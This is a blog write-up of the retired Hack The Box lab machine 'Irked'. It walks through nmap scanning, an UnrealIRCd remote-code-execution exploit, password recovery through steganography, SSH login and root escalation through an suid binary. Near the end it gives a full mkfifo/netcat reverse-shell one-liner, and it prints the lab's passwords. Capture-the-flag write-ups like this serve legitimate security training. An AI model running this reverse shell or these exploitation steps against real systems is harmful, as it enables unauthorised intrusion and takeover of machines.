<hr />

<h2 id="quick-summary">Quick Summary</h2>
<p><br /> Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called <code class="highlighter-rouge">UnrealIRCd</code>. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an <code class="highlighter-rouge">suid</code> binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.117</code>. I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">irked.htb</code>. Let’s jump right in !
<img src="/images/hackthebox/irked/0.png" alt="" /></p>
<hr />

<h2 id="nmap">Nmap</h2>
<p><br /> As always we will start with nmap to scan for open ports and services :
<code class="highlighter-rouge">nmap -sV -sT -sC irked.htb</code>
<img src="/images/hackthebox/irked/1.png" alt="" />
<br /> There is ssh running on port 22 and http running on port 80. Let’s take a look at http.
<br /></p>
<hr />

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><img src="/images/hackthebox/irked/2.png" alt="" />
<br /> There is only that image and a message saying : <code class="highlighter-rouge">IRC is almost working!</code>, Source also has nothing interesting :
<img src="/images/hackthebox/irked/3.png" alt="" />
<br /> We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http.
<br /></p>
<hr />

<h2 id="irc">IRC</h2>
<p><br /> I searched for irc and found <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat#Technical_information">here</a> That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan :
<code class="highlighter-rouge">nmap -p 6000-7000 -sV -sT -sC irked.htb</code>
<img src="/images/hackthebox/irked/4.png" alt="" />
<br /> There is an irc server running on port 6697 called <code class="highlighter-rouge">UnrealIRCd</code>. There are some known vulnerabilities for <code class="highlighter-rouge">UnrealIRCd</code>, One of them is a Remote Code Execution and there is a metasploit module for it :
<img src="/images/hackthebox/irked/5.png" alt="" />
<br /> Let’s check if the server is vulnerable to it.
<img src="/images/hackthebox/irked/6.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/irked/7.png" alt="" />
<br /> It worked and we got a shell as <code class="highlighter-rouge">ircd</code> :
<img src="/images/hackthebox/irked/8.png" alt="" /></p>
<hr />

<h2 id="steg-in-irkedjpg-ssh-as-djmardov">Steg in <code class="highlighter-rouge">irked.jpg</code>, SSH as <code class="highlighter-rouge">djmardov</code></h2>
<p><br /> There are two users on the box : <code class="highlighter-rouge">ircd</code> and <code class="highlighter-rouge">djmardov</code>. I checked <code class="highlighter-rouge">/home/ircd</code> and there was nothing interesting. In <code class="highlighter-rouge">/home/djmardov</code> I didn’t find <code class="highlighter-rouge">user.txt</code> :
<img src="/images/hackthebox/irked/9.png" alt="" />
<br /> I tried to go into <code class="highlighter-rouge">.ssh</code> but I got <code class="highlighter-rouge">Permission denied</code> :
<img src="/images/hackthebox/irked/10.png" alt="" />
<br /> I checked other directories like <code class="highlighter-rouge">Desktop</code>, <code class="highlighter-rouge">Downloads</code>, <code class="highlighter-rouge">Documents</code> etc… And in <code class="highlighter-rouge">Documents</code> I found <code class="highlighter-rouge">user.txt</code> and a file called <code class="highlighter-rouge">.backup</code> :
<img src="/images/hackthebox/irked/11.png" alt="" />
<br />
<br />
<code class="highlighter-rouge">cat .backup</code>
<img src="/images/hackthebox/irked/12.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
</code></pre></div></div>
<p><br /> It gives us a hint about some steg backup, we also get something that looks like a password : <code class="highlighter-rouge">UPupDOWNdownLRlrBAbaSSss</code>. But where will we use that password ? Remember the image we saw earlier on that apache server ?
<img src="/images/hackthebox/irked/2.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/irked/3.png" alt="" />
<br /> I downloaded it then used <code class="highlighter-rouge">steghide</code> to check if there is any hidden file.
<br /> Note : I have a list for some steganography tools, If you are not familiar with steg you can check it <a href="/lists/stego">here</a>.
<code class="highlighter-rouge">wget http://irked.htb/irked.jpg</code>
<img src="/images/hackthebox/irked/13.png" alt="" />
<br />
<br />
<code class="highlighter-rouge">steghide info irked.jpg</code>
<img src="/images/hackthebox/irked/14.png" alt="" />
<br /> There is a hidden text file called <code class="highlighter-rouge">pass.txt</code>, Let’s extract it :
<code class="highlighter-rouge">steghide extract -sf irked.jpg</code>
<img src="/images/hackthebox/irked/15.png" alt="" />
<br />
<br />
<code class="highlighter-rouge">cat pass.txt</code>
<img src="/images/hackthebox/irked/16.png" alt="" />
<br /> We got the password : <code class="highlighter-rouge">Kab6h+m+bbp2J:HG</code>, let’s try to login as <code class="highlighter-rouge">djmardov</code> :
<img src="/images/hackthebox/irked/17.png" alt="" />
<br /> We owned user !
<br /></p>
<hr />

<h2 id="exploiting-viewuser-privilege-escalation-to-root">Exploiting <code class="highlighter-rouge">viewuser</code>, Privilege Escalation to <code class="highlighter-rouge">root</code></h2>
<p><br /> After some enumeration, I searched for <code class="highlighter-rouge">suid</code> binaries and in <code class="highlighter-rouge">/usr/bin</code> I found a binary called <code class="highlighter-rouge">viewuser</code>.
<code class="highlighter-rouge">find /usr/bin/ -perm -4000</code>
<img src="/images/hackthebox/irked/18.png" alt="" />
<br /> It seems interesting so I decided to check it.
<code class="highlighter-rouge">viewuser</code>
<img src="/images/hackthebox/irked/19.png" alt="" />
<br /> It shows logged in users, but we don’t care about that. The only thing we care about is the last line : <code class="highlighter-rouge">/tmp/listusers: 1: /tmp/listusers: djmardov: not found</code>. It seems like it was trying to do something with the file <code class="highlighter-rouge">/tmp/listusers</code> which doesn’t exist. I downloaded <code class="highlighter-rouge">viewuser</code> to try some stuff :
<code class="highlighter-rouge">scp djmardov@irked.htb:/usr/bin/viewuser ./</code>
<img src="/images/hackthebox/irked/20.png" alt="" />
<br /> When I did <code class="highlighter-rouge">ltrace</code> on the binary I found that it executes <code class="highlighter-rouge">/tmp/listusers</code> :
<img src="/images/hackthebox/irked/21.png" alt="" />
<br /> And since this binary runs as root, then it also executes <code class="highlighter-rouge">/tmp/listusers</code> as root. So we can simply get a reverse shell by putting the payload in <code class="highlighter-rouge">/tmp/listusers</code>, Then after running the binary again it should execute the payload.
<code class="highlighter-rouge">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f" &gt; /tmp/listusers</code>
<img src="/images/hackthebox/irked/22.png" alt="" />
<br /> Everything is fine, let’s check our listener :
<img src="/images/hackthebox/irked/23.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/irked/24.png" alt="" />
<br /> Now we own root ! 
<br />
<br />
<br /> That’s it , Feedback is appreciated !
<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
<br /> Thanks for reading.
<br />
<br />
<br /> Previous Hack The Box write-up : <a href="/hack-the-box/teacher/">Hack The Box - Teacher</a>
<br /> Next Hack The Box write-up : <a href="/hack-the-box/bighead/">Hack The Box - BigHead</a></p>
<hr />

